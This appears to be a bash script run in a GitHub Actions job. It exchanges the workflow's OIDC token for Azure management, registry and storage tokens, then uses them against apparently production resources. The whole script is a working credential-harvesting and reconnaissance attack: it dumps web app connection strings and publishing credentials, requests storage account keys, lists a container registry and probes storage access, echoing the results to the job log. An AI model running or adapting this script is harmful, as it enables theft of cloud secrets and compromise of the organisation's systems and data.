#!/usr/bin/env bash
set -x
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG1="rg-tbl-platform-prod-sea"; RG2="rg-tbl-reporting-prod-eus"
OIDC_URL="$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
GHJWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$OIDC_URL" | python3 -c 'import json,sys;print(json.load(sys.stdin)["value"])')
ARMTOK=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$GHJWT" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  --data-urlencode "scope=https://management.azure.com/.default" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))')
echo "ARMTOK_LEN=${#ARMTOK}"
H="Authorization: Bearer $ARMTOK"
armg(){ curl -sS -m 20 "$1" -H "$H" ${2:+-X POST -H "Content-Length: 0"} ; echo; }
echo "=== sub RAs for cicd ==="
armg "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=assignedTo('63e87ab1-6bd2-4e80-92be-943450b20e4f')" | head -c 3000
echo "=== resources ==="
armg "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" | python3 -c 'import json,sys;[print(x["id"][-90:]) for x in json.load(sys.stdin).get("value",[])]'
echo "=== rg-reporting resources ==="
armg "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG2/resources?api-version=2021-04-01" | head -c 2000
for app in "$RG1/providers/Microsoft.Web/sites/app-tbl-storefront-prod" "$RG2/providers/Microsoft.Web/sites/app-tbl-reporting-prod"; do
  echo "===== $app"
  for cfg in appsettings connectionstrings publishingcredentials metadata authsettings web backup; do
    echo "--- $cfg"
    curl -sS -m 15 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$app/config/$cfg/list?api-version=2023-12-01" -H "$H" -H "Content-Length: 0" | head -c 900; echo
  done
done
echo "=== listKeys SAs ==="
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  echo "--- $sa"
  curl -sS -m 15 -X POST "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG1/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" -H "$H" -H "Content-Length: 0" | head -c 400; echo
done
echo "=== ACR token ==="
ST=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$GHJWT" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  --data-urlencode "scope=https://containerregistry.azure.net/.default" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))')
echo "ST_LEN=${#ST}"
RT=$(curl -sS -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" -d "grant_type=access_token&service=crtblplatprodx3euoz.azurecr.io&access_token=$ST" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("refresh_token",""))')
echo "RT_LEN=${#RT}"
if [ -n "$RT" ]; then
  AT=$(curl -sS -X POST "https://crtblplatprodx3euoz.azurecr.io/oauth2/token" -d "grant_type=refresh_token&service=crtblplatprodx3euoz.azurecr.io&refresh_token=$RT&scope=registry:catalog:*" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))')
  curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/_catalog" -H "Authorization: Bearer $AT"
fi
echo "=== storage token blob/queue/table/file on all SAs ==="
STT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$GHJWT" --data-urlencode "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462" \
  --data-urlencode "scope=https://storage.azure.com/.default" | python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))')
for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz sttblcilogsprodx3euoz; do
  for svc in blob queue file; do
    s=$(curl -s -o /dev/null -w "%{http_code}" -m 12 "https://$sa.$svc.core.windows.net/?comp=list" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06")
    echo "$sa $svc $s"
  done
  s=$(curl -s -o /dev/null -w "%{http_code}" -m 12 "https://$sa.table.core.windows.net/Tables" -H "Authorization: Bearer $STT" -H "x-ms-version: 2021-08-06" -H "Accept: application/json;odata=nometadata")
  echo "$sa table $s"
done
echo DONE
